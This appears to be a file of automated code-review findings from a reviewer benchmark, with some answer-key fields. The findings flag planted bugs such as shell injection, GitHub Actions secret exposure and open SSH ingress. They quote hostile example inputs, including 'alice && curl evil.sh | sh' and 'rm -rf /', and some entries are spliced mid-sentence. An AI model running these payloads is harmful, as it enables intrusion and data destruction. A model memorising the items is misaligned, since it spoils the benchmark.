findings.body: PurePath(user_id).name strips everything up to the last slash or backslash from user_id before querying. Any user_id containing a path separator (e.g. "org/123" or a Windows-style "domain\\123") is silently truncated to its final component, so the query looks up the wrong key and returns no row or the wrong user. A user_id is an opaque identifier, not a filesystem path, so path semantics should not be applied to it.
findings.failure_scenario: A caller passes user_id="tenant/42"; PurePath reduces it to "42", the query matches the wrong (or no) user, and find_user silently returns incorrect results with no error.
findings.title: Path-normalizing user_id corrupts legitimate IDs

findings.body: The spec states report commands shall avoid shell interpretation, but execSync with a template string runs the command through a shell, and userName is interpolated unescaped. findings.body: The commit message claims to 'retain fetchUser compatibility', but the change removes the default value of timeoutMs (making it a required argument), changes the return type from Record<string, unknown> to a [record, number] tuple, and drops timeoutMs from the returned object. Every existing caller passing one argument or consuming the returned record will break at compile time or at runtime.
findings.failure_scenario: An existing caller invoking fetchUser('abc') relied on the 30_000 default and on reading .timeoutMs from the result; after this change it fails to compile (missing required argument) and any dynamic caller reading result.timeoutMs gets undefined.
findings.title: Change breaks fetchUser compatibility, contradicting stated intent

findings.body: The change silently transforms the caller's userId with trim().toLowerCase() before querying. If user IDs are case-sensitive (typical for opaque IDs, UUIDs, or usernames stored verbatim), lowercasing changes the lookup key: valid IDs containing uppercase characters will no longer match, and distinct IDs differing only in case can collide onto the same row. Unless the ID column is explicitly case-insensitive and trimmed at write time, this normalization is a correctness bug rather than a cleanup.

findings.body: The change builds 'report --user $user' and runs it through 'sh -c', so any shell metacharacters in user are executed by the shell. This now passes for any non-null return value, so a regression in which rows are dropped, reordered, or corrupted would ship silently — which matters because the implementation now returns rows.subList(1, rows.size()) rather than the full list.

findings.body: The loop calls repo.Load once per id, while the Repository interface already exposes LoadMany (used by the previous implementation). The per-item round-trips scale linearly with input size and reintroduce the N+1 the old code avoided.
findings.failure_scenario: With a large ids slice, the function issues one repository call per id, multiplying latency and load on the backing store where a single batched call would do.
findings.title: Batch the per-id loads with repo.LoadMany

findings.body: The previous implementation returned repo.LoadMany(ids) directly. The new code replaces the batch load with a per-id repo.Load loop and drops any item that is not Active, has a nil Owner, or has a disabled Owner. Unless Repository.Load is guaranteed to return the same set LoadMany would (and the filtering is intended), this changes both the data-access pattern (N queries instead of one batch call) and the returned results.
findings.failure_scenario: Callers that relied on Enrich returning all items for the given ids now silently receive a filtered subset, and the repository issues one Load call per id instead of a single LoadMany, degrading performance on large id lists.
findings.title: Enrich silently changes semantics from LoadMany to per-id filtered loading

findings.body: Switching the trigger to pull_request_target makes the workflow run in the context of the base repository, so secrets like RELEASE_TOKEN are available — while the checkout is explicitly pinned to the pull request's head SHA, i.e. attacker-controlled code. `npm test` from the fork then executes with the token in its environment, allowing any PR author to exfiltrate it. If the intent was to run tests on PRs, keep `on: pull_request` (secrets are not provided to fork PRs) or use a two-workflow approve/run pattern.
findings.failure_scenario: An attacker opens a PR whose test script prints $RELEASE_TOKEN or posts it to an external server; the workflow runs with repository secrets and the token is leaked, granting whatever RELEASE_TOKEN can access.
findings.title: pull_request_target with head checkout exposes RELEASE_TOKEN to untrusted PR code

findings.body: The env block injects secrets.RELEASE_TOKEN into the `npm test` step, which executes code from the pull request head (checked out via github.event.pull_request.head.sha). Under pull_request_target this gives any fork author the token's privileges.
findings.failure_scenario: A PR adds a postinstall script or test that prints the env var or sends it to an attacker endpoint; the token is compromised on every PR.
findings.title: Expose RELEASE_TOKEN to untrusted PR code

findings.body: Even independent of the trigger change, injecting RELEASE_TOKEN into a step that executes PR-supplied code hands the credential to any fork author. If the token is genuinely needed for the review job, it must run only on trusted branches or after maintainer approval, with the secret scoped to a minimal-permission token.
findings.failure_scenario: A malicious PR's test suite reads the RELEASE_TOKEN environment variable and sends it to an attacker-controlled endpoint.
findings.title: Remove the secret from the untrusted-PR job

findings.body: Under pull_request_target, the default checkout is the base branch; explicitly pinning ref to github.event.pull_request.head.sha re-points the workspace at untrusted fork code, which is then run by the `npm test` step. Combined with the secret in the environment this is unsafe; if the intent was to review PR code, the pull_request event already provides an isolated, secret-less context for that checkout.
findings.failure_scenario: Any fork PR causes the workflow to build and execute the fork's code in a privileged context; malicious code in the PR runs automatically without maintainer approval beyond the PR being opened.

findings.body: actions/labeler@v6 is a mutable tag, and the workflow now runs on pull_request_target with a pull-requests:write token. If the tag is ever moved to a compromised commit, attacker-influenced PR events would execute untrusted code with write access to pull requests. Pin the action to a full commit SHA of a known release.
findings.failure_scenario: A moved or hijacked v6 tag runs attacker code in a pull_request_target context, which can post malicious labels/comments or exfiltrate the workflow token.
findings.title: Pin third-party action to a commit SHA

findings.body: The original code returned all items from repository.load_many(item_ids). findings.body: datetime.utcnow() is deprecated since Python 3.12 and returns a naive datetime with no timezone attached, unlike the previous datetime.now(UTC) which produced an aware timestamp. The import of UTC was removed in this same change, so it must be restored.
findings.failure_scenario: On Python 3.12+ every call emits a DeprecationWarning, and consumers comparing or serialising fetched_at get a naive timestamp that can be misinterpreted as local time or fail arithmetic against aware datetimes.
findings.title: Replace deprecated datetime.utcnow() with datetime.now(UTC)

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit claims to keep fetch_user backward compatible, but the change makes timeout a required positional argument (previously defaulted to 30), changes the return type from dict to a tuple, and drops the docstring. Every existing caller passing one argument or expecting a dict breaks.
findings.failure_scenario: An existing caller invoking fetch_user('u1') raises TypeError for the missing timeout argument, and callers using the returned dict now receive a tuple, causing downstream attribute/key errors.
findings.title: Signature change contradicts backward-compatibility intent

findings.body: The user-supplied string is interpolated into a shell command string executed via `sh -c`. Any shell metacharacters in `user` (e.g. `alice; rm -rf /` or `$(...)`) are interpreted by the shell, letting an attacker run arbitrary commands. findings.body: `rows.sublist(1)` throws RangeError when `rows` is empty, and silently discards the first element for non-empty lists. Neither behaviour is justified by the change.

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact returned list to `isNotNull`, which passes for any non-null value — including the empty list, a truncated list, or garbage. Since `renderReport` now returns `rows.sublist(1)`, the assertion no longer verifies the new slicing behaviour at all, so a regression in row handling would ship silently.
findings.failure_scenario: If `sublist(1)` is changed to drop the wrong elements or throw on short lists, the test still passes and the regression reaches production.
findings.title: Weakened test asserts only isNotNull instead of exact rows

findings.body: The new code runs the command through /bin/sh -c with the user value string-concatenated into the command line. Any shell metacharacter in `user` (e.g. `alice; rm -rf /` or `alice && curl ...`) is interpreted by the shell, giving arbitrary command execution. The previous ProcessBuilder form passed the user as a single argument without a shell; the replacement reintroduces injection. If a shell is not needed, exec the program directly with argument array; if it is, validate/escape the input.

findings.body: The PreparedStatement created here is never closed. Each call to find() allocates a new statement (and often a new server-side handle); under repeated calls this leaks JDBC resources until the connection's statement cache or the database exhausts them. Use try-with-resources so the statement is closed when the result set is done, or document that the caller closes it.
findings.failure_scenario: Under sustained traffic, unclosed statements accumulate on the connection and database, eventually causing 'too many open cursors/statements' errors or connection exhaustion.

findings.body: Switching the trigger to pull_request_target makes the workflow run in the context of the base branch, so the RELEASE_TOKEN secret is available to the job. The checkout step is explicitly pinned to github.event.pull_request.head.sha, meaning the untrusted PR's code is what runs with that secret in its environment. This is the classic GitHub Actions 'pwn request': any fork can open a PR whose test/CI scripts exfiltrate RELEASE_TOKEN. If the intent was to review PRs with secrets available, the secret-bearing steps must run only on trusted code (e.g. checkout the base ref, or gate the secret step on an approval/label from a maintainer).
findings.failure_scenario: An attacker forks the repo, adds code to the test scripts that prints or uploads $RELEASE_TOKEN, and opens a pull_request_target PR; the workflow checks out the attacker's head sha, runs npm test with RELEASE_TOKEN in env, and the secret is exfiltrated, granting write/release access.
findings.title: pull_request_target + PR-head checkout exposes RELEASE_TOKEN to untrusted code

findings.body: With pull_request_target, checking out github.event.pull_request.head.sha places untrusted PR code in the workspace, and the subsequent npm run executes it. Combined with the secret exposure this is exploitable; even without the secret, arbitrary code execution on your runner is a risk. If the intent is to test PR code, the plain pull_request trigger already does this safely without secrets.
findings.failure_scenario: A malicious PR contains a modified test or postinstall hook; the workflow checks out and runs it on the pull_request_target trigger, giving the attacker arbitrary code execution on the CI runner.
findings.title: Checking out the PR head SHA under pull_request_target runs untrusted code

expected.label: pull_request_target executes untrusted head with a secret

findings.title: Behavior silently changed from load_many to filtered per-item loading

findings.body: The user string is interpolated into a shell command executed via `sh -c`. Any metacharacters in `user` (e.g. `alice; rm -rf /` or `$(...)`) are interpreted by the shell, letting an attacker run arbitrary commands. The previous version passed `user` as a direct argv element, which was safe; the rewrite to `sh -c` reintroduces injection.
findings.failure_scenario: A caller passes a user value containing shell metacharacters; `sh -c` executes the attacker's appended commands with the privileges of the process.
findings.title: Fix command injection by passing user as an argument, not through the shell

findings.body: The commit message says "preserve report rows for named users", but the new code discards the first element of `rows` via `skip(1)`. Nothing in the intent explains removing a row; this changes the function's output for every caller.
findings.failure_scenario: render_report("alice", vec!["first", "second"]) now returns ["second"] instead of both rows; callers relying on the full row set silently lose data.
findings.title: skip(1) silently drops the first row, contradicting stated intent

findings.body: The previous test asserted the exact returned rows; the replacement only asserts the vector is non-empty. Since render_report now skips the first row, an assertion this weak would pass even if the function returned the unskipped rows, the rows in the wrong order, or all rows except a different one. The test no longer pins down the new skip(1) behaviour.
findings.title: Strengthen the weakened assertion to verify row contents

findings.body: Replacing repo.load_many(ids) with a per-id repo.load(*id) loop issues one repository call per id. Unless Repository::load is a trivial in-memory lookup, this is a round-trip/performance regression, and the commit message gives no rationale for abandoning the batched API.
findings.failure_scenario: With a large ids slice backed by a remote repository, enrich makes N network/database round trips instead of one batched call, multiplying latency and load.
findings.title: N+1 loads replace the single batched load_many call

findings.body: The previous implementation returned every item from repo.load_many(ids). The new loop pushes an item only when item.active is true, item.owner is Some, and the owner is enabled; items failing any of these checks are silently omitted with no error or logging. If callers relied on enrich returning one item per requested id, they now get missing results with no indication of why.
findings.failure_scenario: A caller passes ids where one item is inactive or has owner == None; enrich returns fewer items than ids supplied, and downstream code processing the result silently skips those records instead of surfacing them.
findings.title: Silently drops items that are inactive or have no owner

findings.body: Three levels of nested if/if-let/if inside the loop can be flattened with early `continue` guards, making the filter conditions read as a flat checklist.
findings.title: Flatten nested conditionals with guard clauses

expected.label: nested option and state checks hide predicate

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64)
findings.body: The commit message says 'keep fetch_user source compatible', but the function's signature changes from (id, Option<u64>) -> UserRecord to (id, u64) -> (UserRecord, u64). Every existing caller passing Option<u64> or destructuring the return value will fail to compile, and the timeout_ms parameter is now ignored entirely (returned instead of applied).
findings.failure_scenario: Any existing caller compiles against the new signature and fails, or if adapted, silently loses the timeout behaviour since timeout_ms is returned rather than used.
findings.title: Signature change breaks source compatibility claimed by the commit

findings.body: The old code passed timeout_ms.unwrap_or(30_000) into UserRecord::new; the new code drops the timeout entirely and echoes the parameter back as a tuple element. If the intent is to preserve behaviour, the timeout should still reach UserRecord::merge or the record construction.
findings.failure_scenario: A caller passes timeout_ms = 1000 expecting a 1s timeout; the value is ignored and simply returned, so the record is built with whatever default merge uses.
findings.title: timeout_ms is returned instead of being applied

findings.body: If name resolves to the root itself (e.g. name is "." or an empty path), candidate equals root, strip_prefix returns an empty path, and the check passes. File::open then attempts to open a directory, which on Unix succeeds for read-only access, returning a directory handle instead of a regular file.
findings.failure_scenario: A caller passes name="."; the guard passes with an empty relative path and File::open returns a directory File rather than an error, breaking callers that expect a regular report file.
findings.title: Empty strip_prefix result lets the root itself through

findings.body: The canonicalize-then-open sequence is not atomic: a symlink swap between the two calls can still make File::open resolve outside root. If stronger guarantees are needed, open the file first and canonicalize the opened handle (e.g. via /proc/self/fd on Linux or file-path-based checks on the opened descriptor).
findings.failure_scenario: An attacker replaces the candidate path with a symlink pointing outside root after canonicalize but before open; the opened file escapes the root containment check.
findings.title: TOCTOU gap between canonicalize and open

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.body: The user-supplied `user` string is interpolated into a shell command executed via `sh -c`, so any shell metacharacters in `user` are interpreted by the shell. An attacker who controls `user` can execute arbitrary commands (e.g. `alice; rm -rf /` or `alice && curl evil.sh | sh`). The original code passed arguments as a list, which does not invoke a shell; the new code introduces this injection. Even without `sh -c`, interpolation is unsafe — pass the string interpolation into a shell command executed via `sh -c`, so any shell metacharacters in `user` are interpreted by the shell. An attacker who controls `user` can execute arbitrary commands (e.g. `alice; rm -rf /` or `alice && curl evil.sh | sh`). The original code passed arguments as a list, which does not invoke a shell; the new code introduces this injection. Even without `sh -c`, interpolation is unsafe — pass the argument as a separate list element.
findings.failure_scenario: A request with user = 'alice; cat /etc/passwd' causes the shell to run the injected command with the privileges of the report process.
findings.title: Fix command injection by passing arguments as a list

findings.body: The spec states 'Rendering shall preserve every row', and the old code returned rows unchanged. rows.sublist(1) silently discards the first element, so callers lose data. The test was also weakened to isNotNull so it no longer detects this.
findings.failure_scenario: renderReport('alice', ['first', 'second']) returns ['second']; the first report row is lost in every call.
findings.title: renderReport drops the first row, violating the spec's row preservation

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact returned rows to `isNotNull`, which passes for almost any non-null result and would not catch the new `sublist(1)` behaviour, an empty-input crash, or any future regression in what `renderReport` returns.
findings.title: Restore a real assertion instead of isNotNull

findings.body: The old implementation used repository.loadMany(ids) for a single batched call; the new loop issues repository.load(id) once per id, so the cost scales linearly with the number of ids and reintroduces an N+1 query pattern.
findings.failure_scenario: With a large ids list, each iteration performs its own repository round-trip, multiplying latency and load on the repository compared to the previous single batched loadMany call.
findings.title: Batch the per-id repository loads (N+1)

findings.body: Previously enrich returned every item from repository.loadMany(ids). The new code returns only items where item.active() and item.owner().enabled() (and drops items with a null owner). The commit message ('plant java-efficiency-design-v1') gives no indication of this behavior change, so callers relying on the old contract will silently lose results. If the filtering is intentional, it should be stated and tested; if not, it is a regression.
findings.failure_scenario: A caller that previously received all loaded items now silently receives only active items with enabled owners; inactive or owner-less items disappear from results without any documented contract change.
findings.title: Silent semantic change: results now filtered

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit message says 'preserve UserClient caller compatibility', but the method signature changes from returning User to returning Map.Entry<User, Integer>. Every existing caller expecting a User will fail to compile or misbehave at runtime.
findings.failure_scenario: Any existing caller doing `User u = client.fetch(id, 1000)` no longer compiles, or if callers are dynamic, they receive a Map.Entry instead of a User and fail.
findings.title: Return type change breaks the caller contract the PR claims to preserve

findings.body: The diff only adds the java.util.Date import; Map.Entry and Map.entry require java.util.Map to be imported, otherwise the file will not compile.
findings.failure_scenario: Compilation fails with 'cannot find symbol: class Map' since only java.util.Date is imported.
findings.title: Map.Entry used without importing java.util.Map

findings.body: The query parameter is normalized with trim().toLowerCase() before matching against the id column. If user IDs are stored case-sensitively (e.g. UUIDs or IDs containing uppercase letters), the lookup will silently fail to find existing users.
findings.failure_scenario: A caller passes userId "Abc123"; the query searches for "abc123", finds no row, and the caller treats an existing user as missing.
findings.title: Lowercasing the user ID can break lookups for case-sensitive IDs

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The prepared statement is created and returned without being closed. Unlike the previous createStatement() usage, prepared statements hold server-side resources; if callers do not close the returned ResultSet's statement, they leak until GC or connection exhaustion.
findings.failure_scenario: Repeated find() calls without callers closing the statement accumulate open statements, eventually exhausting the connection's statement limit.
findings.title: PreparedStatement is never closed, leaking statement resources

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: Switching the trigger from pull_request to pull_request_target makes this workflow run with access to secrets on pull requests from forks, while the checkout is pinned to the PR head commit. The PR's own code (npm test) therefore executes with RELEASE_TOKEN in its environment, letting any fork author exfiltrate the secret. The commit message 'plant github-actions-security-v1' also signals this is an intentionally planted backdoor, contradicting any legitimate review-workflow intent.
findings.failure_scenario: An attacker opens a fork PR whose test script prints $RELEASE_TOKEN or posts it to an external server; the workflow runs on pull_request_target with secrets access and the token is leaked.
findings.title: pull_request_target runs privileged workflow on untrusted PR code

findings.body: The secret is passed as an env var to a step that runs `npm test` against the PR head checkout. Fork PR code is untrusted; any code executed during the test run can read process.env.RELEASE_TOKEN and send it to an attacker-controlled endpoint. Secrets must only be available to steps that do not execute untrusted code.
findings.failure_scenario: A malicious PR adds a test or npm lifecycle hook that reads RELEASE_TOKEN and posts it to an external URL; the workflow runs on pull_request_target with the secret injected, leaking the credential.
findings.title: RELEASE_TOKEN exposed to untrusted pull request code

observations.stdout: [{"path": "main.tf", "line": 6, "side": "RIGHT", "severity": "critical", "title": "Restrict SSH ingress to 0.0.0.0/0 is a critical exposure", "body": "The admin SSH rule's CIDR is widened from the internal 10.20.0.0/16 to 0.0.0.0/0, exposing port 22 to the entire internet. This is also unrelated to the stated intent (commit 'plant terraform-security-v1' describes nothing about opening SSH), so it appears to be a smuggled security-relevant change.", "failure_scenario": "Once applied, any internet host can attempt SSH connections to the admin security group, enabling brute-force or exploitation of the SSH service.", "suggestion": "  cidr_blocks = [\"10.20.0.0/16\"]", "anchor": "  cidr_blocks = [\"0.0.0.0/0\"]", "anchored": true, "broad": false, "confidence": 10, "category": "intent"}]

findings.body: The condition rejects only the literal "0.0.0.0/0". Equivalent public CIDRs such as "0.0.0.0/1", "::/0", or other broad ranges pass validation, so SSH ingress can still be opened to the internet. If broader protection is intended, validate with a proper CIDR check (e.g. cidrhost/cidrnetmask checks or a list of allowed ranges) rather than a string comparison.
findings.failure_scenario: A caller sets admin_cidr = "0.0.0.0/1"; validation passes and port 22 is exposed to half the internet, defeating the guard's stated purpose.
findings.title: Validation only blocks the exact string 0.0.0.0/0

ground_truth.clean_trap: The ingress CIDR became configurable, but its safe default and validation explicitly reject public admin access.
ground_truth.name: terraform-clean-context-v1
